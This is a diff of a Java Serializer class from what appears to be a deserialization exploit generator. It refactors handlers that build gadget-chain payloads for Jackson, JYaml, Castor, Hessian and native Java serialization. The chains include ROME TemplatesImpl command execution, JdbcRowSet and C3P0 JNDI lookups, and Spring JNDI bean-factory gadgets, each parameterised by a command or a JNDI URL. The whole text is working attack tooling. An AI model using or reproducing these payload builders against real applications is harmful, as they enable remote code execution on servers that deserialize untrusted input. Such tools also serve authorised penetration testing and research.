@@ -108,11 +108,10 @@ public class Serializer implements Callable<byte[]> {
             if (BASE64) {
                 String base64String = Base64.getEncoder().encodeToString(bos.toByteArray());
                 System.out.println(base64String);
-                return;
             } else {
                 System.out.println(bos);
-                return;
             }
+            return;
         } else if (IS_JsonIO) {
             if (payloadType.equals("SpringAbstractBeanFactoryPointcutAdvisor")) {
                 UtilFactory uf = new UtilFactory();
@@ -152,9 +151,13 @@ public class Serializer implements Callable<byte[]> {
         }
 
         if (IS_Hessian1 || IS_Hessian2) {
-            AobjOut.writeObject(obj);
+            if (AobjOut != null) {
+                AobjOut.writeObject(obj);
+            }
         } else {
-            objOut.writeObject(obj);
+            if (objOut != null) {
+                objOut.writeObject(obj);
+            }
         }
 
         if (BASE64) {
@@ -165,7 +168,7 @@ public class Serializer implements Callable<byte[]> {
 
     public static Object makeRome(String Command) throws Exception {
         UtilFactory uf = new UtilFactory();
-        String args[] = {Command};
+        String[] args = {Command};
         Object tpl = TemplatesUtil.createTemplatesImpl(args);
         Object obj1 = makeROMEAllPropertyTrigger(uf, Templates.class, (Templates) tpl);
         String marshalled = JsonWriter.objectToJson(obj1);
@@ -187,7 +190,7 @@ public class Serializer implements Callable<byte[]> {
         globalinline = true;
         if (payloadType.equals("C3P0WrapperConnPool")) {
             URI uri = new URI(command);
-            String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
+            String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
             return writeObject(
                     WrapperConnectionPoolDataSource.class,
                     Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
@@ -196,77 +199,80 @@ public class Serializer implements Callable<byte[]> {
         }
     }
 
-    public static Object JacksonHandler(String payloadType, String command) throws Exception {
-        if (payloadType.equals("SpringAbstractBeanFactoryPointcutAdvisor")) {
-            String jndiUrl = command;
-            Map<String, String> values = new LinkedHashMap<>();
-            values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
-            values.put("adviceBeanName", quoteString(jndiUrl));
-            return writeCollection(
-                    HashSet.class.getName(),
-                    writeJackJsonObject(DefaultBeanFactoryPointcutAdvisor.class, values),
-                    writeJackJsonObject(DefaultBeanFactoryPointcutAdvisor.class, Collections.EMPTY_MAP));
-        } else if (payloadType.equals("C3P0WrapperConnPool")) {
-            URI uri = new URI(command);
-            String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
-            return writeJackJsonObject(
-                    WrapperConnectionPoolDataSource.class,
-                    Collections.singletonMap("userOverridesAsString", quoteString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
-        } else if (payloadType.equals("SpringPropertyPathFactory")) {
-            Map<String, String> values = new LinkedHashMap<>();
-            String jndiUrl = command;
-            values.put("targetBeanName", quoteString(jndiUrl));
-            values.put("propertyPath", quoteString("foo"));
-            values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
-            return writeJackJsonObject(PropertyPathFactoryBean.class, values);
-        } else if (payloadType.equals("JdbcRowSet")) {
-            Map<String, String> values = new LinkedHashMap<>();
-            values.put("dataSourceName", quoteString(command));
-            values.put("autoCommit", "true");
-            return writeJackJsonObject(JdbcRowSetImpl.class, values);
-        } else if (payloadType.equals("C3P0RefDataSource")) {
-            Map<String, String> values = new LinkedHashMap<>();
-            values.put("jndiName", quoteString(command));
-            values.put("loginTimeout", "0");
-            return writeJackJsonObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", values);
-        } else {
-            return null;
+    public static Object JacksonHandler(String payloadType, String jndiUrl) throws Exception {
+        switch (payloadType) {
+            case "SpringAbstractBeanFactoryPointcutAdvisor": {
+                Map<String, String> values = new LinkedHashMap<>();
+                values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
+                values.put("adviceBeanName", quoteString(jndiUrl));
+                return writeCollection(
+                        HashSet.class.getName(),
+                        writeJackJsonObject(DefaultBeanFactoryPointcutAdvisor.class, values),
+                        writeJackJsonObject(DefaultBeanFactoryPointcutAdvisor.class, Collections.EMPTY_MAP));
+            }
+            case "C3P0WrapperConnPool":
+                URI uri = new URI(jndiUrl);
+                String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
+                return writeJackJsonObject(
+                        WrapperConnectionPoolDataSource.class,
+                        Collections.singletonMap("userOverridesAsString", quoteString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
+            case "SpringPropertyPathFactory": {
+                Map<String, String> values = new LinkedHashMap<>();
+                values.put("targetBeanName", quoteString(jndiUrl));
+                values.put("propertyPath", quoteString("foo"));
+                values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
+                return writeJackJsonObject(PropertyPathFactoryBean.class, values);
+            }
+            case "JdbcRowSet": {
+                Map<String, String> values = new LinkedHashMap<>();
+                values.put("dataSourceName", quoteString(jndiUrl));
+                values.put("autoCommit", "true");
+                return writeJackJsonObject(JdbcRowSetImpl.class, values);
+            }
+            case "C3P0RefDataSource": {
+                Map<String, String> values = new LinkedHashMap<>();
+                values.put("jndiName", quoteString(jndiUrl));
+                values.put("loginTimeout", "0");
+                return writeJackJsonObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", values);
+            }
+            default:
+                return null;
         }
     }
 
     public static String JYamlHandler(String payloadType, String command) throws URISyntaxException, IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
-        if (payloadType.equals("JdbcRowSet")) {
-            Map<String, String> properties = new LinkedHashMap<>();
-            properties.put("dataSourceName", writeString(command));
-            properties.put("autoCommit", "true");
-            return writeObject(JdbcRowSetImpl.class, properties);
-        } else if (payloadType.equals("C3P0WrapperConnPool")) {
-            URI uri = new URI(command);
-            String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
-            return writeObject(
-                    WrapperConnectionPoolDataSource.class,
-                    Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
-        } else if (payloadType.equals("C3P0RefDataSource")) {
-            Map<String, String> props = new LinkedHashMap<>();
-            props.put("jndiName", writeString(command));
-            props.put("loginTimeout", "0");
-            return writeObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", props);
-        } else {
-            return null;
+        switch (payloadType) {
+            case "JdbcRowSet":
+                Map<String, String> properties = new LinkedHashMap<>();
+                properties.put("dataSourceName", writeString(command));
+                properties.put("autoCommit", "true");
+                return writeObject(JdbcRowSetImpl.class, properties);
+            case "C3P0WrapperConnPool":
+                URI uri = new URI(command);
+                String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
+                return writeObject(
+                        WrapperConnectionPoolDataSource.class,
+                        Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
+            case "C3P0RefDataSource":
+                Map<String, String> props = new LinkedHashMap<>();
+                props.put("jndiName", writeString(command));
+                props.put("loginTimeout", "0");
+                return writeObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", props);
+            default:
+                return null;
         }
     }
 
-    public static Object CastorHandler(String payloadType, String command) throws URISyntaxException, IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
+    public static Object CastorHandler(String payloadType, String jndiName) throws URISyntaxException, IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
         if (payloadType.equals("SpringAbstractBeanFactoryPointcutAdvisor")) {
-            String jndiName = command;
             return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                     + "xmlns:java=\"http://java.sun.com\" xsi:type=\"java:org.springframework.beans.factory.config.PropertyPathFactoryBean\">"
                     + "<target-bean-name>" + jndiName + "</target-bean-name><property-path>foo</property-path>"
                     + "<bean-factory xsi:type=\"java:org.springframework.jndi.support.SimpleJndiBeanFactory\">" + "<shareable-resource>" + jndiName
                     + "</shareable-resource></bean-factory></x>";
         } else if (payloadType.equals("C3P0WrapperConnPool")) {
-            URI uri = new URI(command);
-            String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
+            URI uri = new URI(jndiName);
+            String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
             return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                     + "xmlns:java=\"http://java.sun.com\" xsi:type=\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" "
                     + "user-overrides-as-string=\"" + C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]) + "\"/>";
@@ -275,21 +281,21 @@ public class Serializer implements Callable<byte[]> {
         }
     }
 
-    protected static String writeObject(Class<?> clazz, Map<String, String> properties, String... consArgs) {
-        return writeObject(clazz.getName(), properties, consArgs);
+    protected static String writeObject(Class<?> clazz, Map<String, String> properties) {
+        return writeObject(clazz.getName(), properties);
     }
 
-    protected static String writeObject(String clazz, Map<String, String> properties, String... consArgs) {
-        return writeObject(clazz, properties, 0, consArgs);
+    protected static String writeObject(String clazz, Map<String, String> properties) {
+        return writeObject(clazz, properties, 0);
     }
 
-    protected static String writeObject(Class<?> clazz, Map<String, String> properties, int level, String... consArgs) {
-        return writeObject(clazz.getName(), properties, level, consArgs);
+    protected static String writeObject(Class<?> clazz, Map<String, String> properties, int level) {
+        return writeObject(clazz.getName(), properties, level);
     }
 
-    protected static String writeObject(String clazz, Map<String, String> properties, int level, String... consArgs) {
+    protected static String writeObject(String clazz, Map<String, String> properties, int level) {
         StringBuilder sb = new StringBuilder();
-        sb.append(writeConstructor(clazz, globalinline, consArgs));
+        sb.append(writeConstructor(clazz, globalinline));
 
         if (!properties.isEmpty()) {
             int indent = (level + 1) * 2;
@@ -306,15 +312,9 @@ public class Serializer implements Callable<byte[]> {
         return sb.toString();
     }
 
-    protected static String writeConstructor(Class<?> clazz, boolean inline, String... args) {
-        return writeConstructor(clazz.getName(), inline, args);
-    }
-
-    protected static String writeConstructor(String clazz, boolean inline, String... args) {
-        StringBuilder sb = new StringBuilder();
-        sb.append(constructorPrefix(inline));
-        sb.append(clazz);
-        return sb.toString();
+    protected static String writeConstructor(String clazz, boolean inline) {
+        return constructorPrefix(inline) +
+                clazz;
     }
 
     protected static String constructorPrefix(boolean inline) {
